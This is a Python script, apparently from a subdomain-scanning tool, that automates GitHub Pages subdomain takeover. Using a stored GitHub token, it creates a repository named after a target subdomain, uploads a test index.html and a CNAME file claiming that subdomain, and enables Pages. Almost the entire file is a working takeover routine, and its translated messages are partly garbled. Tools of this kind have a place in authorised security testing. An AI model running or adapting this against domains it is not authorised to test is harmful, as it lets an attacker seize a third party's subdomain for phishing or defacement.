#!/usr/bin/env python3
# coding=utf-8

"""
githubAutomatic takeover
"""

import json
import base64
import requests
from config import settings

HEADERS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/63.0.3239.84 Safari/537.36",
}


def github_takeover(url):
    # Read config configuration file
    repo_name = url
    print('[*]Reading configuration file')
    user = settings.github_api_user
    token = settings.github_api_token
    headers = {
        "Authorization": 'token ' + token,
        "Accept": "application/vnd.github.switcheroo-preview+json"
    }
    repos_url = 'https://api.github.com/repos/' + user + '/' + repo_name
    repos_r = requests.get(url=repos_url, headers=headers)
    # Verify that the token is correct
    if 'message' in repos_r.json():
        if repos_r.json()['message'] == 'Bad credentials':
            print('[*]Please check if the Token is correct')
        elif repos_r.json()['message'] == 'Not Found':
            print('[*]Building takeover library')  # Generate takeover library
            creat_repo_dict = {
                "name": repo_name,
                "description": "This is a subdomain takeover Repository",
            }
            creat_repo_url = 'https://api.github.com/user/repos'
            creat_repo_r = requests.post(url=creat_repo_url,
                                         headers=headers,
                                         data=json.dumps(creat_repo_dict))
            creat_repo_status = creat_repo_r.status_code
            if creat_repo_status == 201:
                print('[*]Create a takeover library' + repo_name + 'Success, automatic takeover is in progress')
                # Take over file generation
                # index.html file
                html = b'''
                <html>
                    <p>Subdomain Takerover Test!</>
                </html>
                '''
                html64 = base64.b64encode(html).decode('utf-8')
                html_dict = {
                    "message": "my commit message",
                    "committer": {
                        "name": "user",  # Submit id, optional item
                        "email": "user@163.com"  # Same as above
                    },
                    "content": html64
                }
                # CNAME file
                cname_url = bytes(url, encoding='utf-8')
                cname_url64 = base64.b64encode(cname_url).decode('utf-8')
                url_dict = {
                    "message": "my commit message",
                    "committer": {
                        "name": "user",
                        "email": "user@163.com"
                    },
                    "content": cname_url64
                }
                base_url = 'https://api.github.com/repos/'
                html_url = base_url + user + '/' + repo_name + '/contents/index.html'
                url_url = base_url + user + '/' + repo_name + '/contents/CNAME'
                html_r = requests.put(url=html_url, data=json.dumps(html_dict),
                                      headers=headers)  # Upload index.html
                cname_r = requests.put(url=url_url, data=json.dumps(url_dict),
                                       headers=headers)  # Upload CNAME
                rs = cname_r.status_code
                if rs == 201:
                    print('[*]The takeover library was successfully generated and Github pages is being opened')
                    page_url = "https://api.github.com/repos/" + user + "/" + url + "/pages"
                    page_dict = {
                        "source": {
                            "branch": "master"
                        }
                    }
                    page_r = requests.post(url=page_url,
                                           data=json.dumps(page_dict),
                                           headers=headers)  # Open page
                    if page_r.status_code == 201:
                        print('[+]Automatic takeover succeeded, please visit http later://' + str(url) + 'View Results')
                    else:
                        print('[+] Failed to open Github pages, please check the network or try again later')
                else:
                    print('[+] Failed to generate the takeover library, please check the network or try again later')
    elif url in repos_r.json()['name']:
        print('[*]Failed to generate takeover library, please check https://github.com/' + user +
              '?tab=repositories whether there is a takeover library with the same name')
